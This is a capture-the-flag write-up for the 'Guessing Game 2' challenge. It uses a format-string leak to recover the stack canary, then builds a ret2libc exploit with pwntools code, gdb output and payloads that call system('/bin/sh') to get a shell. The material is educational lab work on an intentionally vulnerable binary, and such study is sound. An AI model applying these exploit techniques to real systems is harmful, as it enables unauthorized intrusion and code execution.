<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>Guessing Game2</title>
  <style>
      code{white-space: pre-wrap;}
      span.smallcaps{font-variant: small-caps;}
      span.underline{text-decoration: underline;}
      div.column{display: inline-block; vertical-align: top; width: 50%;}
  </style>
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
    <head>
      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
      <script type="text/javascript" src="../../js/common.js"></script>
    </head>
</head>
<body>
    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
    <div id="content" class="content" style="width:70%;height:auto">
<header id="title-block-header">
<h1 class="title">Guessing Game2</h1>
</header>
<h2 id="guess-the-number">Guess the number</h2>
<p>From the source code, we know the number is calculated with <code>rand</code> address.</p>
<pre><code>(rand % 4096) + 1</code></pre>
<p>The address might change when the program starts everytime, so we could search the number in range <em>[-4096, 4096]</em>.</p>
<h2 id="disassemble-the-program">Disassemble the program</h2>
<p>Run <code>radare2</code> to disassemble the program</p>
<pre><code> r2 ./vuln</code></pre>
<p>Execute <code>pd $s &gt; vuln.asm</code> in r2, exam output <em>vuln.asm</em>, the canary is loaded from <code>gs:[0x14]</code>, which stored a random generated number, into <code>[ebp-0xc]</code>. Before the function returns, the canary is checked and call <code>__stack_chk_fail_local</code> on failed. The canary changes everytime the program start running, but the location on stack is fixed, so we need to find the canary address.</p>
<pre><code>0x08048783      65a114000000   mov eax, dword gs:[0x14]
0x08048789      8945f4         mov dword [ebp - 0xc], eax
0x0804878c      31c0           xor eax, eax
...
0x080487e9      8b45f4         mov eax, dword [ebp - 0xc]
0x080487ec      653305140000.  xor eax, dword gs:[0x14]
0x080487f3      7405           je 0x80487fa
0x080487f5      e816010000     call sym.__stack_chk_fail_local
0x080487fa      8b5dfc         mov ebx, dword [ebp - 4]
0x080487fd      c9             leave
0x080487fe      c3             ret</code></pre>
<h2 id="find-canary">Find canary</h2>
<p>The winner name buffer allow us to input something, use the <code>printf</code> format string to print positional parameters, ‘%N$lx’ for the Nth parameter.</p>
<pre><code>num = None
for i in range(1, 200):
    if num is None:
        num = must_guess(pr)
    else:
        pr.sendlineafter(&quot;What number would you like to guess?\n&quot;, str(num))
    pr.readline()
    pr.sendlineafter(&quot;New winner!\nName? &quot;, &#39;XXX %{}$lx&#39;.format(i))
    print(i, pr.readline())</code></pre>
<p>In the output, several lines suspicious, like 20th, 119th and 166th.</p>
<pre><code>...
18 b&#39;Congrats: XXX 0\n&#39;
19 b&#39;Congrats: XXX 1\n&#39;
20 b&#39;Congrats: XXX 1cdadcae\n&#39;   canary?
21 b&#39;Congrats: XXX 79804f\n&#39;
22 b&#39;Congrats: XXX fffff7e0\n&#39;
...
116 b&#39;Congrats: XXX f7f69d20\n&#39;
117 b&#39;Congrats: XXX 1c\n&#39;
118 b&#39;Congrats: XXX ff8e5238\n&#39;
119 b&#39;Congrats: XXX 1fc74300\n&#39;  canary?
120 b&#39;Congrats: XXX f7f69d20\n&#39;
121 b&#39;Congrats: XXX a\n&#39;
...
164 b&#39;Congrats: XXX 0\n&#39;
165 b&#39;Congrats: XXX 73fe43f7\n&#39;
166 b&#39;Congrats: XXX db4605e7\n&#39;   canary?
167 b&#39;Congrats: XXX 0\n&#39;
...</code></pre>
<p>Run the program from gdb, set a breakpoint at <em>0x080487e9</em>, where to load the prestored canary value into <em>eax</em>.</p>
<pre><code>pwndbg&gt; b *0x080487e9
Breakpoint 1 at 0x80487e9</code></pre>
<p>By checking the suspicious lines, the 119th looks like what we are looking for.</p>
<pre><code>What number would you like to guess?
-2815
Congrats! You win! Your prize is this print statement!

New winner!
Name? %119$lx
Congrats: 9ef1d800</code></pre>
<p>Execute one step forward and check the value in <em>eax</em>. which means the value at 119th indeed is the canary value.</p>
<pre><code>pwndbg&gt; si
0x080487ec in win ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────
*EAX  0x9ef1d800
 EBX  0x8049fbc (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049ec4 (_DYNAMIC) ◂— 0x1
 ECX  0xffffffff
 EDX  0xffffffff
 EDI  0xf7edc000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7edc000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0xff812258 —▸ 0xff812278 ◂— 0x0
 ESP  0xff812040 ◂— 0x1
*EIP  0x80487ec (win+126) ◂— xor    eax, dword ptr gs:[0x14]
──────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────
   0x80487e9 &lt;win+123&gt;    mov    eax, dword ptr [ebp - 0xc]
 ► 0x80487ec &lt;win+126&gt;    xor    eax, dword ptr gs:[0x14]
   0x80487f3 &lt;win+133&gt;    je     win+140 &lt;win+140&gt;
    ↓
   0x80487fa &lt;win+140&gt;    mov    ebx, dword ptr [ebp - 4]
   0x80487fd &lt;win+143&gt;    leave  
   0x80487fe &lt;win+144&gt;    ret    
 
   0x80487ff &lt;main&gt;       lea    ecx, [esp + 4]
   0x8048803 &lt;main+4&gt;     and    esp, 0xfffffff0
   0x8048806 &lt;main+7&gt;     push   dword ptr [ecx - 4]
   0x8048809 &lt;main+10&gt;    push   ebp
   0x804880a &lt;main+11&gt;    mov    ebp, esp</code></pre>
<h2 id="find-eip-address">Find EIP address</h2>
<p>We need to find EIP address to figure out how many padding do we need. Run the program in <code>gdb</code>, set a breakpoint at <em>leave</em> instruction in <code>win</code>, feed it 100 ‘A’.</p>
<pre><code>pwndbg&gt; b *0x080487fd
Breakpoint 1 at 0x80487fd
pwndbg&gt; r
Starting program: /home/zlynch-picoctf/vuln 
warning: Error disabling address space randomization: Operation not permitted
Welcome to my guessing game!
Version: 2

What number would you like to guess?
-2815
Congrats! You win! Your prize is this print statement!

New winner!
Name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre>
<p>Now it breaks, check the first 32 words at the top of the stack. The <em>0x41414141</em> block starts at <em>0xffce1d7c</em>, so we know this is where the buffer starts.</p>
<pre><code>pwndbg&gt; x/32wx $esp
0xffce1d70:     0x00000001      0xfffff501      0xfffff501      0x41414141
0xffce1d80:     0x41414141      0x41414141      0x41414141      0x41414141
0xffce1d90:     0x41414141      0x41414141      0x41414141      0x41414141
0xffce1da0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffce1db0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffce1dc0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffce1dd0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffce1de0:     0x00000000      0x00000000      0x00000000      0x00000000</code></pre>
<p>Use <code>info frame</code> to find out where EIP is. <em>eip at 0xffce1f8c</em> in <em>saved registers</em> section tell us exactly what we are looking for.</p>
<pre><code>pwndbg&gt; info frame
Stack level 0, frame at 0xffce1f90:
 eip = 0x80487fd in win; saved eip = 0x804888c
 called by frame at 0xffce1fc0
 Arglist at 0xffce1f88, args: 
 Locals at 0xffce1f88, Previous frame&#39;s sp is 0xffce1f90
 Saved registers:
  ebx at 0xffce1f84, ebp at 0xffce1f88, eip at 0xffce1f8c</code></pre>
<p>By calculating the distance between EIP address and buffer address we know the padding is <em>528</em>. The buffer size is 512 bytes and canary is 4 bytes, so we need another 12 bytes of padding before EIP.</p>
<pre><code>pwndbg&gt; p/d 0xffce1f8c-0xffce1d7c 
$1 = 528</code></pre>
<p>We need to add 12 bytes padding to get to EIP after canary.</p>
<h2 id="find-version-of-libc">Find version of libc</h2>
<p>Now we need to call <code>puts</code> to print the address of itself, the payload would be</p>
<p><code>padding(512bytes) + canary + padding(12bytes) + puts plt address + win address + puts got address</code></p>
<p>Find address of <code>puts</code> on server by running the script.</p>
<pre><code>elf = pwn.ELF(target, False)
payload = b&#39;A&#39; * 512 + pwn.p32(canary) + b&#39;B&#39;*12
payload += pwn.p32(elf.plt[&#39;puts&#39;])
payload += pwn.p32(elf.sym[&#39;win&#39;])
payload += pwn.p32(elf.got[&#39;puts&#39;])
pr.sendlineafter(&quot;What number would you like to guess?\n&quot;, str(num))
pr.sendlineafter(&quot;New winner!\nName? &quot;, payload)
pr.readline()
pr.readline()
puts_addr = pwn.u32(pr.readline()[:4])</code></pre>
<p>With the address we found matches using website <a href="https://libc.blukat.me/?q=puts%3A0xf7dab3d0&amp;l=libc6-i386_2.27-3ubuntu1.2_amd64">libc database search</a></p>
<pre><code>Matches
libc6-i386_2.27-3ubuntu1.2_amd64</code></pre>
<p>Find <code>system</code> offset and <code>str_bin_sh</code> offset from <a href="https://libc.blukat.me/d/libc6-i386_2.27-3ubuntu1.2_amd64.symbols">libc6-i386_2.27-3ubuntu1.2_amd64</a>. Then the addresses could be calculated.</p>
<pre><code>libc_base = puts_addr - 0x673d0
sys_addr = libc_base + 0x3cd80
binsh_addr = libc_base + 0x17bb8f</code></pre>
<h2 id="get-shell">Get shell</h2>
<p>To get shell we need to call <code>system</code> with argument <code>/bin/sh</code>. Again as <code>win</code> has been called when we try to find address of <code>puts</code>, now we just send the payload when winner name is asked. The payload follow format</p>
<p><code>padding(512bytes) + canary + padding(12bytes) + system address + win address + string bin sh address</code></p>
<pre><code>payload = b&#39;A&#39; * 512 + pwn.p32(canary) + b&#39;B&#39;*12
payload += pwn.p32(sys_addr)
payload += pwn.p32(elf.sym[&#39;win&#39;])
payload += pwn.p32(binsh_addr)</code></pre>
<p>Finally, combine them all to get shell and get the flag.</p>
    </div>
    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
</body>
</html>
